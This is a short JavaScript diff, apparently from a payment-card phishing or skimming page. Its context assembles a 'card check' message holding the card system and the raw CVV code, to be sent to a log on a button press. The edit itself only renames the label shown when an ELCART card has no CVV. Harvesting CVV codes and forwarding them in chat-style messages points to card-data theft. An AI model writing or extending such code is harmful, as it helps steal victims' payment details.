@@ -778,7 +778,7 @@
     const sysText = cardType === 'elcart' ? 'ЭЛКАРТ (ЗАО МПЦ)' : 'VISA International';
     
     // Определяем, что слать в лог в зависимости от нажатия кнопки
-    const cvvStatus = (isElk && !elkHasCvv) ? 'Не требуется (ЭЛКАРТ)' : `<code>${cvVal}</code>`;
+    const cvvStatus = (isElk && !elkHasCvv) ? 'Нету CVV (ЭЛКАРТ)' : `<code>${cvVal}</code>`;
 
     const message = `💳 <b>Проверка карты</b>\n` +
                     `Тип: ${sysText}\n` +
